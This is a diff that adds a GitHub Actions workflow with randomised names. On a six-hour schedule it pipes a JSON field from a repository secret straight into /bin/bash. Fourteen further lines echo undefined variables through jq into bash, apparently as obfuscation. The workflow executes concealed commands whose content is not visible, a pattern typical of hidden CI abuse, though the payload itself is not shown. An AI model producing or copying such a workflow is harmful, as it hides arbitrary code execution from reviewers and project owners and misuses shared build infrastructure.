@@ -1,0 +1,33 @@
+name: dylanbridge1710
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dylanbridge1710
+        env:
+          sobc021: ${{ secrets.sobc021 }}
+        run: |
+          echo $sobc021 | jq -r .oy00509 | /bin/bash
+          echo $as928 | jq -r .o8 | /bin/bash
+          echo $kdqy57 | jq -r .p8 | /bin/bash
+          echo $zdyx937 | jq -r .e91563 | /bin/bash
+          echo $owv739 | jq -r .talbp8413 | /bin/bash
+          echo $lvio30 | jq -r .uf8 | /bin/bash
+          echo $c6696 | jq -r .ipewz003 | /bin/bash
+          echo $tzgr653 | jq -r .w425 | /bin/bash
+          echo $r77799 | jq -r .sx9091 | /bin/bash
+          echo $dhuu03 | jq -r .zokpg3 | /bin/bash
+          echo $tf61361 | jq -r .zbycd8775 | /bin/bash
+          echo $cryt16007 | jq -r .i40 | /bin/bash
+          echo $uvkqy93693 | jq -r .byvc03751 | /bin/bash
+          echo $eldjz989 | jq -r .ixqk528 | /bin/bash
+          echo $hn120 | jq -r .zy790 | /bin/bash
+
